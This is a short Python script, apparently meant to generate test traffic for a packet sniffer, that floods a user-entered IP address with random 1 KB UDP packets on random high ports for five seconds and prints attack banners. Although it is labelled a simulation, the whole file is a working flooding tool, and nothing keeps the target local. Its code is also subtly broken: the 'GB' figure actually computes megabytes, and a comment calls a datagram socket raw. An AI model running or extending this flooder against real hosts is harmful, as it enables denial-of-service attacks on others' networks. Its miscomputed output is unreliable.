import socket
import random
import time

def simulate_udp_flood(target_ip, duration_seconds=5):
    print(f"TARGET LOCKED: {target_ip}")
    print("Initiating simulated volumetric burst in 3 seconds...")
    time.sleep(3)
    
    # Create a raw UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Generate a random 1024-byte payload (1KB)
    payload = random.randbytes(1024)
    
    timeout = time.time() + duration_seconds
    packets_sent = 0
    
    print("ATTACK INITIATED. FLOODING NETWORK...")
    
    try:
        while time.time() < timeout:
            # Pick a random high port to avoid hitting real services
            target_port = random.randint(10000, 60000)
            sock.sendto(payload, (target_ip, target_port))
            packets_sent += 1
            
            # Tiny sleep to prevent crashing your own python environment
            time.sleep(0.001) 
            
    except KeyboardInterrupt:
        print("\nAttack aborted manually.")
        
    print("="*40)
    print(f"ATTACK COMPLETE.")
    print(f"Total Packets Fired: {packets_sent}")
    print(f"Estimated Volume: {round((packets_sent * 1024) / 1024 / 1024, 4)} GB")
    print("="*40)

if __name__ == "__main__":
    # We target your router's default IP or broadcast to guarantee Scapy sees it
    # 192.168.1.255 is a standard broadcast, but changing it to your actual local IP is best.
    target = input("Enter your machine's local IP address (e.g., 192.168.1.x): ")
    simulate_udp_flood(target, duration_seconds=5)